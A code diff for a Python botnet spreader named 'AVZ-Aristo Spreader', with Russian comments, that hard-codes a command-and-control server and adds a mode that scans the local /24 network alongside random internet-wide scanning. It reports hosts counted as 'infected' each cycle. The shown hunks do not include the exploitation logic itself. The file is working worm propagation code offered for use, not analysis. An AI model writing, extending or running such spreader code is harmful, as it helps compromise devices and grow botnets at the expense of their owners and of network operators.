@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
-# AVZ-Aristo Spreader v25.7.1 – исправлены импорты, поддержка --count
+# AVZ-Aristo Spreader v25.7.2 – глобальный и локальный режимы
 import asyncio, aiohttp, random, socket, time, json, os, subprocess, threading, sys, argparse
 import telnetlib
-from queue import Queue
+import ipaddress
 
 C2_HOST = "80.249.146.202"
 C2_PORT = 80
@@ -21,6 +21,16 @@ def random_ip():
     for i in range(4):
         octets[i] |= (host >> (8*(3-i))) & 0xFF
     return ".".join(map(str, octets))
+
+def get_local_ips():
+    """Возвращает список IP локальной /24 сети, исключая себя."""
+    try:
+        local_ip = socket.gethostbyname(socket.gethostname())
+    except:
+        print("[!] Не удалось определить локальный IP")
+        return []
+    network = ipaddress.IPv4Network(f"{local_ip}/24", strict=False)
+    return [str(host) for host in network.hosts() if str(host) != local_ip]
 
 async def probe_port(ip, port):
     try:
@@ -129,7 +139,7 @@ async def worker(queue, stats):
             stats['fail'] += 1
         queue.task_done()
 
-async def scan_cycle(count):
+async def global_scan(count):
     q = asyncio.Queue()
     stats = {'success':0, 'fail':0}
     ips = [random_ip() for _ in range(count)]
@@ -141,15 +151,40 @@ async def scan_cycle(count):
         t.cancel()
     return stats
 
+async def local_scan():
+    ips = get_local_ips()
+    if not ips:
+        return {'success':0, 'fail':0}
+    print(f"[*] Сканируем локальную сеть, {len(ips)} хостов")
+    q = asyncio.Queue()
+    stats = {'success':0, 'fail':0}
+    for ip in ips:
+        q.put_nowait(ip)
+    tasks = [asyncio.create_task(worker(q, stats)) for _ in range(min(MAX_CONCURRENT, len(ips)))]
+    await q.join()
+    for t in tasks:
+        t.cancel()
+    return stats
+
 def main():
     parser = argparse.ArgumentParser()
-    parser.add_argument('--count', type=int, default=DEFAULT_SCAN_COUNT)
+    group = parser.add_mutually_exclusive_group()
+    group.add_argument('--count', type=int, default=DEFAULT_SCAN_COUNT, help='Количество случайных IP для глобального сканирования')
+    group.add_argument('--local', action='store_true', help='Сканировать локальную /24 сеть')
     args = parser.parse_args()
-    print(f"[*] Spreader v25.7.1 started with count={args.count}")
-    while True:
-        stats = asyncio.run(scan_cycle(args.count))
-        print(f"Cycle: +{stats['success']} infected, {stats['fail']} failed")
-        time.sleep(30)
+
+    if args.local:
+        print("[*] Режим: локальная сеть")
+        while True:
+            stats = asyncio.run(local_scan())
+            print(f"Цикл: +{stats['success']} заражено, {stats['fail']} пропущено")
+            time.sleep(30)
+    else:
+        print(f"[*] Режим: глобальный, {args.count} целей за цикл")
+        while True:
+            stats = asyncio.run(global_scan(args.count))
+            print(f"Цикл: +{stats['success']} заражено, {stats['fail']} пропущено")
+            time.sleep(30)
 
 if __name__ == '__main__':
     main()
